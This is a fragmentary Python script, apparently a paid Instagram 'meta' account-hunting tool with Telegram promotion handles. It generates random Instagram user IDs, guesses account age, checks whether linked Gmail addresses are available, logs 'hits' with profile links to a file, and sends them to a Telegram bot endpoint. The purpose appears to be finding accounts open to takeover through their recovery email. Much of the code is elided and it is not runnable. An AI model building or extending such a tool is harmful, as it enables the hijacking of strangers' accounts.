...
clear()
print(f"{Fore.CYAN}{Style.BRIGHT}😾 𝐒𝐡𝐚𝐧𝐤𝐬 𝐩𝐚𝐢𝐝 𝐚𝐜𝐜𝐞𝐬𝐬 𝐬𝐲𝐬𝐭𝐞𝐦.!\n")
...
# 𝐘𝐎𝐔𝐑 𝐏𝐀𝐈𝐃 𝐓𝐎𝐎𝐋 𝐇𝐄𝐑𝐄
# ==========================
print(f"{Fore.GREEN}✨ 𝐏𝐀𝐈𝐃 𝐓𝐎𝐎𝐋 𝐈𝐒 𝐍𝐎𝐖 𝐑𝐔𝐍𝐍𝐈𝐍𝐆. 𝐄𝐍𝐉𝐎𝐘.!")F()
H()
...
bo = f'\x1b[38;5;{b}m'
print("\x1b[1;39m━" * 70)
Token=input("𝐄𝐧𝐭𝐞𝐫 𝐲𝐨𝐮𝐫 𝐛𝐨𝐭 𝐭𝐨𝐤𝐞𝐧: ")
print("\x1b[1;39m━" * 70)
ID=input('𝐄𝐧𝐭𝐞𝐫 𝐲𝐨𝐮𝐫 𝐢𝐝: ')


newuser = f'''✨🌌 𝐀 𝐧𝐞𝐰 𝐬𝐭𝐚𝐫 𝐞𝐧𝐭𝐞𝐫𝐞𝐝 𝐭𝐡𝐞 𝐮𝐧𝐢𝐯𝐞𝐫𝐬𝐞 ! 🌌✨  

🚀 𝐆𝐦𝐚𝐢𝐥 𝐦𝐞𝐭𝐚 𝐚𝐧𝐝 𝐛𝐢𝐳𝐳 𝐦𝐞𝐭𝐚 𝐡𝐮𝐧𝐭𝐢𝐧𝐠 𝐭𝐨𝐨𝐥 𝐢𝐬 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝  
🆔 ID       : {ID}  
👾 Username  : tg://openmessage?user_id={ID}
...
def tll():
    try:
        ...
        with open('shanks.txt', 'w',encoding='utf-8') as f:
            f.write(f'{tl}//{host}\n')
...
def date(Id):
    try:
        ...
        if 1 < uid < 1279000:
            ...
            return 2018
        elif 8507940634 <= uid < 12540300000:
            return 2019
        elif 12540300001 <= uid < 15000000000:
            return 2020
        elif 15000000001 <= uid < 17000000000:
            return 2021
        elif 17000000001 <= uid < 18500000000:
            return 2022
        elif 18500000001 <= uid < 20000000000:
            return 2023
        elif 20000000001 <= uid < 21000000000:
            return 2024
        elif 21000000001 <= uid <= 21254029834:
            return 2025
        else:
            return "Unknown"
    except Exception:
...
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
 ...
 𝐌𝐞𝐭𝐚   : ﴾ {meta} ﴿  
 𝐁𝐢𝐳𝐳   : ﴾ {bizz} ﴿  
 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦   : https://www.instagram.com/{username}
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩  
 𝐃𝐞𝐯 : @vzn7p
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
𝗝𝗢𝗜𝗡 @novaredirect 𝗔𝗡𝗗 @sh4nks_redirect
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
'''
    with open("shanks.txt" if 100 <= fows < 500 else "shanks.txt" if fows >= 500 else "shanks.txt", "a", encoding='utf-8') as file:
        file.write(ss+"\n")
    try:
        try:
            requests.get(f"https://api.telegram.org/bot/sendMessage?chat_id=&text={ID}\n{ss}")
        except Exception as e:
            print(f"  h ") 
        try:
...
def Gmail(email):
    ...
    try:
        ...
        try:
            o = open('shanks.txt', 'r').read().splitlines()[0]
        except:
            o = open('shanks.txt', 'r').read().splitlines()[0]
...
def uuu():
 while True:
  try:
    ...
    Ido = 21254029834
    while True:      
      rnd = str(random.randint(17750001, 21254029834))
